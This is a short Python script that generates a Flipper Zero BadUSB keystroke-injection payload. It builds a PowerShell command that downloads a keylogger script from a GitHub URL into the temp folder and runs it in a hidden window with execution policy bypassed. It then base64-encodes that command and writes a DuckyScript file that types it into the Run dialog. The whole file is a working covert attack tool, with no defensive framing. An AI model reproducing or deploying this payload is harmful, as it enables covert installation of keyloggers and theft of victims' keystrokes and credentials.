import base64

cmd = (
    "$ErrorActionPreference='SilentlyContinue';"
    "$ProgressPreference='SilentlyContinue';"
    "try{[Net.ServicePointManager]::SecurityProtocol=[Net.SecurityProtocolType]::Tls12}catch{};"
    "$u='https://raw.githubusercontent.com/naturalniyaboba2077/flipper-keylogger/main/keylogger.ps1';"
    "$p=Join-Path $env:TEMP 'k.ps1';"
    "try{(New-Object Net.WebClient).DownloadFile($u,$p)}catch{};"
    "if(Test-Path $p){Start-Process -FilePath 'powershell.exe' -WindowStyle Hidden "
    "-ArgumentList ('-NoP -NonI -W Hidden -Ep Bypass -File \"'+$p+'\"')}"
)
b64 = base64.b64encode(cmd.encode("utf-16le")).decode("ascii")
print(b64)
print("LEN", len(b64), file=__import__("sys").stderr)

out = r"C:\Users\user\Documents\Flipper projects\flipper-keylogger\payload_enc.txt"
text = f"""REM Alternate: -EncodedCommand (no quote breakage). EN layout.
REM Use if multi-line payload.txt still shows red errors.

DELAY 3000
GUI r
DELAY 800
STRING powershell -NoP -NonI -W Hidden -Ep Bypass -EncodedCommand {b64}
ENTER
"""
open(out, "w", encoding="utf-8", newline="\n").write(text)
print("wrote", out)
